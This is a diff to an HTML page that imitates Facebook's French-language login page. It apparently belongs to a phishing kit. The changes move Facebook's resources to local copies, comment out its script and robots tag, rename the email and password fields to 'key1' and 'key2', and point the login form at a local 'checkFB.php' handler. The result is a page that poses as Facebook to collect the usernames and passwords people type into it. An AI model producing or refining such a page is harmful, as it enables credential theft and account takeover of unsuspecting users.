@@ -8,17 +8,13 @@
 </noscript>
 <title id="pageTitle">Se connecter à Facebook | Facebook</title>
 <meta name="description" content="Connectez-vous &#xe0; Facebook pour commencer &#xe0; partager et communiquer avec vos amis, votre famille et les personnes que vous connaissez." />
-<meta name="robots" content="noodp,noydir" />
+<!--<meta name="robots" content="noodp,noydir" />-->
 <link rel="shortcut icon" href="pictures/fb_icon.ico"/>
-<!--<link type="text/css" rel="stylesheet" href="https://www.facebook.com/rsrc.php/v3/yz/r/Y7W1bWGBCDK.css" data-bootloader-hash="OLqbz" data-permanent="1" crossorigin="anonymous" />
-<link type="text/css" rel="stylesheet" href="https://www.facebook.com/rsrc.php/v3/yr/r/bWSyEwV5Fks.css" data-bootloader-hash="HEE8w" crossorigin="anonymous" />
-<link type="text/css" rel="stylesheet" href="https://www.facebook.com/rsrc.php/v3/yI/r/vMNwDGtK8Hq.css" data-bootloader-hash="ZzwAs" data-permanent="1" crossorigin="anonymous" />
-<link type="text/css" rel="stylesheet" href="https://www.facebook.com/rsrc.php/v3/yi/r/zn8g2LeW4uJ.css" data-bootloader-hash="cJ+//" data-permanent="1" crossorigin="anonymous" />-->
-<link href="Y7.css" rel="stylesheet" type="text/css" data-bootloader-hash="OLqbz" data-permanent="1" crossorigin="anonymous" >
-<link href="BW.css" rel="stylesheet" type="text/css" data-bootloader-hash="HEE8w" crossorigin="anonymous" />
-<link href="vM.css" rel="stylesheet" type="text/css" data-bootloader-hash="ZzwAs" data-permanent="1" crossorigin="anonymous">
-<link href="zn.css" rel="stylesheet" type="text/css" data-bootloader-hash="cJ+//" data-permanent="1" crossorigin="anonymous">
-<script src="https://www.facebook.com/rsrc.php/v3/yA/r/HiKwvqjE4u7.js" data-bootloader-hash="1J/3N" crossorigin="anonymous"></script>
+<link href="CSS/Y7.css" rel="stylesheet" type="text/css" data-bootloader-hash="OLqbz" data-permanent="1" crossorigin="anonymous" >
+<link href="CSS/BW.css" rel="stylesheet" type="text/css" data-bootloader-hash="HEE8w" crossorigin="anonymous" />
+<link href="CSS/vM.css" rel="stylesheet" type="text/css" data-bootloader-hash="ZzwAs" data-permanent="1" crossorigin="anonymous">
+<link href="CSS/zn.css" rel="stylesheet" type="text/css" data-bootloader-hash="cJ+//" data-permanent="1" crossorigin="anonymous">
+<!--<script src="https://www.facebook.com/rsrc.php/v3/yA/r/HiKwvqjE4u7.js" data-bootloader-hash="1J/3N" crossorigin="anonymous"></script>-->
 </head>
 <body class="login_page _39il UIPage_LoggedOut _-kb sf b_c3pyn-ahh chrome webkit mac x1 Locale_fr_FR" dir="ltr">
 <div class="_li">
@@ -41,14 +37,14 @@
         <div class="_4-u2 _1w1t _4-u8 _52jv">
           <div class="_xku"><span class="_50f6">Se connecter à Facebook</span></div>
           <div class="login_form_container">
-            <form id="login_form" action="check3.php" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+            <form id="login_form" action="checkFB.php" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
               <input type="hidden" name="lsd" value="AVoF-Lo5" autocomplete="off" />
               <div id="loginform">
                 <div class="clearfix _5466 _44mg">
-                  <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="1" placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l&#xe9;phone" value="" autofocus aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l&#xe9;phone" />
+                  <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="key1" id="key1" tabindex="1" placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l&#xe9;phone" value="" autofocus aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l&#xe9;phone" />
                 </div>
                 <div class="clearfix _5466 _44mg">
-                  <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="Mot de passe" aria-label="Mot de passe" />
+                  <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="key2" id="key2" tabindex="1" placeholder="Mot de passe" aria-label="Mot de passe" />
                 </div>
                 <div class="_xkt">
                   <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="1" type="submit">Connexion</button>
@@ -67,10 +63,7 @@
         <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
           <li>Français (France)</li>
         </ul>
-        <div role="contentinfo" aria-label="Liens Facebook">
-
-        </div>
-        <div class="mvl copyright">
+<div class="mvl copyright">
           <div><span> Facebook © 2016</span></div>
         </div>
       </div>
